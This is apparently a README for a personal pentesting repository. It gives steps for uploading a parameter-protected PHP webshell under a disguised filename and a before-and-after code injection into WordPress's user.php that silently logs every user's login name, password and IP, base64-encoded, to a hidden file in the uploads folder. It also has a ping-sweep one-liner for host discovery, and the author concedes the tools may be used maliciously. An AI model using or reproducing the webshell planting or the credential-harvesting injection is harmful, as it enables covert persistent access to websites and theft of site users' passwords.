# JustRepository

Testing project

## Getting Started

These are some repository tools and code I made for pentesting. I want to say "use this for educational purposes only" but I know it wont change your evil thoughts.

### Webshell.php

simple webshell that protected with parameter.
Upload shell. rename it with ".page.backup.php". 
Call it with your own parameter:
```
example.com/uploads/.page.backup.php?dxnboy=4343
```
Modified from:

* **Flozz** - *PHP shell* - [P0wny Shell](https://github.com/flozz/p0wny-shell)

### Inject Wordpress

Inject user.php in wordpress to record credentials that login. Required user priviledge that can write to wordpress directory. 
edit file wordpress/wp-include/user.php.

before
```
if ( ! empty( $credentials['remember'] ) ) {
                $credentials['remember'] = true;
} else {
                $credentials['remember'] = false;
}
```

after inject
```
if ( ! empty( $credentials['remember'] ) ) {
                $credentials['remember'] = true;
                date_default_timezone_set('Asia/Jakarta');
                $credz = date('Y-m-d H:i:s') . " || IP: " . get_client_ip() . " || Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'];
                file_put_contents('wp-content/uploads/.page.txt', base64_encode($credz).PHP_EOL, FILE_APPEND);
} else {
                $credentials['remember'] = false;
                date_default_timezone_set('Asia/Jakarta');
                $credz = date('Y-m-d H:i:s') . " || IP: " . get_client_ip() . " || Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'];
                file_put_contents('wp-content/uploads/.page.txt', base64_encode($credz).PHP_EOL, FILE_APPEND);
}
```

Encoded with base64. call it in: and decode it with base64
```
wordpress/wp-content/uploads/.page.txt
```

### ping.sh

Simpe ping with bash. or you can use this simple script through command line with this:
```
time for i in {1..254}; do (ping -c 1 172.19.0.$i | grep "bytes from" | cut -d':' -f1 | cut -d' ' -f4 &); done
```
